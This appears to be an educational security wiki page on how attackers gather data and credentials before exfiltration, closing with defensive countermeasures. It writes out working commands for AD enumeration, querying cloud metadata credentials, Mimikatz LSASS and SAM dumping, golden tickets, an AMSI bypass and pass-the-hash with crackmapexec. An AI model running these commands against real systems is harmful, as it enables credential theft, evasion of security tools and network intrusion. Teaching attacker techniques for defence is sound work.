# Hoarding like a winter is coming: Strategic stockpiling (2025)

Before attackers [exfiltrate](exfiltration.md) data, they meticulously collect and consolidate sensitive information from compromised 
systems. Below are modern techniques used in 2025, including network reconnaissance and credential harvesting with 
Mimikatz, along with real-world examples.

## Techniques for data collection

Attackers use a mix of automated tools, living-off-the-land binaries (LOLBins), and AI-driven methods to gather data 
stealthily.

### Automated data discovery

* AI-Powered Scanning: Attackers deploy machine learning models to identify high-value files (e.g., financial records, intellectual property) by analyzing file metadata, keywords, and access patterns.
* File Crawling Scripts: Custom PowerShell/Python scripts recursively scan directories for sensitive documents (e.g., *.docx, *.xlsx, *.pdf) and compress them for [exfiltrate](exfiltration.md).

### Network information gathering

Attackers map internal networks to identify lateral movement opportunities. Tools like arp-scan or Nmap list all 
active hosts in a subnet, and for Active Directory (AD) enumeration, BloodHound visualizes AD attack paths by 
ingesting data via SharpHound.

```powershell
Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem  
Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, LastLogonDate  
```

In cloud environments (AWS/Azure), attackers query instance metadata for credentials:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  
```

### Credential harvesting with Mimikatz

Mimikatz remains a top tool for stealing credentials from Windows systems, with new evasion techniques:

***Technique 1: LSASS memory dumping***

The classic method extracts plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"  
```

The 2025 evasion uses:

* Process Injection: Mimikatz is loaded into a benign process (e.g., explorer.exe) to bypass EDR.
* AMSI Bypass: Disables Windows Antimalware Scan Interface (AMSI) before execution:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)  
```

***Technique 2: SAM & LSA secrets extraction***

Offline dumping can extract local user hashes from the Security Account Manager (SAM) database.

```bash
mimikatz.exe "lsadump::sam /system:SYSTEM /sam:SAM"  
```

Live System extraction retrieves cached domain credentials from the Local Security Authority (LSA).

```bash
mimikatz.exe "token::elevate" "lsadump::secrets"  
```

***Technique 3: Kerberos ticket theft***

The Golden Ticket Attack Forges Kerberos tickets for persistent domain access.

```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt"  
```
        
## Example: Collecting network data & credentials

Scenario: Corporate Network Intrusion

### Initial access 

Phishing email → Employee executes malicious macro → C2 beacon established.

### Network recon

Host discovery:

```bash
nmap -sn 192.168.1.0/24  
```

Share enumeration:

```bash
net view \\target-pc /ALL  
```

### Credential harvesting:

Mimikatz execution:

```bash
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'  
```

Lateral movement can use Pass-the-Hash (PtH) with stolen NTLM hashes:
    
```bash
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH>  
```

## Defensive countermeasures

* Restrict LSASS Access: Enable LSASS Protection (Windows Defender Credential Guard).
* Monitor for Mimikatz Signatures: EDR Alerts: Detect sekurlsa::logonpasswords or unusual process injection.
* Network Segmentation: Limit lateral movement via VLANs and strict firewall rules.

## Specific mitigations (2025)

* AI-Driven Anomaly Detection: Tools like SentinelOne use behavioural AI to block Mimikatz in real-time.
* Zero Trust Architecture: Enforces least-privilege access, reducing credential misuse.

## 2025

In 2025, attackers are refining data collection with AI-driven scanning, advanced Mimikatz evasion, and cloud 
exploitation. Defenders must adopt behavioural detection, Zero Trust, and credential hardening to counter these threats.
